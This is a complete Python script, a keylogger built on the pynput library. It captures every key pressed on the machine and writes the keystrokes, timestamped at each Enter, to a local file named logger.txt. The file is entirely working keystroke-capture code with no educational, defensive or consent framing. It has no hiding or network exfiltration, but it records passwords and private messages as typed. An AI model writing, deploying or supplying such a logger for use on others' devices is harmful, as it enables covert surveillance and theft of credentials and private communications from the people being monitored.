import os
import datetime
from pynput.keyboard import Listener, Key

path = 'logger.txt'
keys = []

def on_press(key):
    global keys

# Add the key to the list
    keys.append(key)

# If Enter is pressed, log the keys along with the timestamp
    if key == Key.enter:
        write_file(keys)
        keys = []  # Clear the list after writing to the file

def write_file(keys):
    with open(path, 'a') as f:
    
# Record the current timestamp
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"\n{timestamp} - ")  # Log the timestamp before the keys

        for key in keys:
            if isinstance(key, Key):
                if key == Key.backspace:
                    f.write('Backspace')
                elif key == Key.enter:
                    f.write('\n')
                elif key == Key.shift:
                    f.write('Shift')
                elif key == Key.space:
                    f.write(' ')
                elif key == Key.caps_lock:
                    f.write('Caps Lock')
            else:
                f.write(str(key).replace("'", ""))

# Set up and start the listener
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Key logging stopped by user (Ctrl + C).")
